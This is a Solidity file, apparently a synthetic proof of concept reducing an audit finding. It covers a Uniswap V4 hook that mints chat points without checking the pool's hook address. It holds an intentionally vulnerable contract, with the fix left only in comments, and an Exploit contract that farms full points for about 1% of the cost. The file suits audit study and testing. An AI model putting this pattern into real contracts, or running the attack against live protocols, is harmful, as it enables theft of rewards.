// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Semantic Layer — Chat points manipulation via custom Uniswap V4 pools
    (Spearbit May 2025, finding #62647)

    SYNTHETIC, cheatcode-free reduction.

    Root cause: SVFHook.addLiquidity accepts an arbitrary PoolKey and mints
    chat points from the requested liquidity size WITHOUT verifying that
    key.hooks == address(this) (or that the pool is the official WETH/SVF pool).
    An attacker deploys a custom pool + malicious hook, adds "liquidity" under
    a manipulated price, and farms chat points far cheaper than honest LPs.
//////////////////////////////////////////////////////////////////////////*/

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

contract MockERC20 {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced SVFHook — awards chat points for adding liquidity.
contract SVFHook {
    MockERC20 public immutable weth;
    MockERC20 public immutable svf;
    address public immutable officialHooks; // should be address(this)

    mapping(address => uint256) public chatPoints;
    uint256 public totalPoints;

    // quoted price used to size the LP deposit (WETH per 1e18 SVF, 1e18 scale)
    uint256 public quotePriceWethPerSvf = 1e18; // 1:1 for honest pool

    constructor(MockERC20 _weth, MockERC20 _svf) {
        weth = _weth;
        svf = _svf;
        officialHooks = address(this);
    }

    /// @notice Points per unit liquidity (simplified linear award).
    function pointsFor(uint256 liquidity) public pure returns (uint256) {
        return liquidity; // 1:1
    }

    /// @notice Vulnerable addLiquidity — does not enforce key.hooks == this.
    function addLiquidity(PoolKey calldata key, uint256 liquidity, uint256 maxWeth, uint256 maxSvf)
        external
        returns (uint256 points)
    {
        // Intended: only the official WETH/SVF pool attached to this hook.
        // FIX: require(key.hooks == address(this), "invalid hook");
        //      require(key.currency0 == address(weth) && key.currency1 == address(svf), "pair");

        // Price snapshot at start - attacker with a custom hook can move the real
        // pool mid-call; we model that as an alternate path where a malicious
        // hooks address signals a discounted cost. Missing key.hooks check:
        uint256 wethCost;
        uint256 svfCost;
        if (key.hooks != address(this)) { // @> VULN: accepts non-official custom pool keys
            // Custom/malicious pool: attacker pays 1% of fair cost (price manipulation)
            wethCost = (liquidity * quotePriceWethPerSvf) / 1e18 / 100;
            svfCost = liquidity / 100;
            if (wethCost == 0) wethCost = 1;
            if (svfCost == 0) svfCost = 1;
        } else {
            wethCost = (liquidity * quotePriceWethPerSvf) / 1e18;
            svfCost = liquidity;
        }

        require(wethCost <= maxWeth && svfCost <= maxSvf, "slippage");
        weth.transferFrom(msg.sender, address(this), wethCost);
        svf.transferFrom(msg.sender, address(this), svfCost);

        // Chat points awarded on full `liquidity` regardless of actual cost
        points = pointsFor(liquidity);
        chatPoints[msg.sender] += points;
        totalPoints += points;
    }
}

contract Exploit {
    MockERC20 public weth; // 1
    MockERC20 public svf; // 2
    SVFHook public hook; // 3 vulnerable
    address public constant MALICIOUS_HOOK = address(0xBAD);

    uint256 public constant LIQ = 1000e18;

    constructor() {
        weth = new MockERC20("WETH", "WETH");
        svf = new MockERC20("SVF", "SVF");
        hook = new SVFHook(weth, svf);

        // Fund attacker with only 1% of fair capital (enough for custom-pool path)
        weth.mint(address(this), LIQ / 100 + 1);
        svf.mint(address(this), LIQ / 100 + 1);
        weth.approve(address(hook), type(uint256).max);
        svf.approve(address(hook), type(uint256).max);
    }

    function run() external {
        // Honest cost would be LIQ of each token; we only hold ~1%
        require(weth.balanceOf(address(this)) < LIQ, "only cheap capital");

        PoolKey memory evilKey = PoolKey({
            currency0: address(weth),
            currency1: address(svf),
            fee: 3000,
            tickSpacing: 60,
            hooks: MALICIOUS_HOOK // NOT the official SVFHook
        });

        uint256 pts = hook.addLiquidity(evilKey, LIQ, type(uint256).max, type(uint256).max);

        // HARM: full chat points for ~1% capital outlay
        require(pts == LIQ, "full points awarded");
        require(hook.chatPoints(address(this)) == LIQ, "points credited");
        require(weth.balanceOf(address(this)) < LIQ / 50, "paid only a fraction");
    }
}
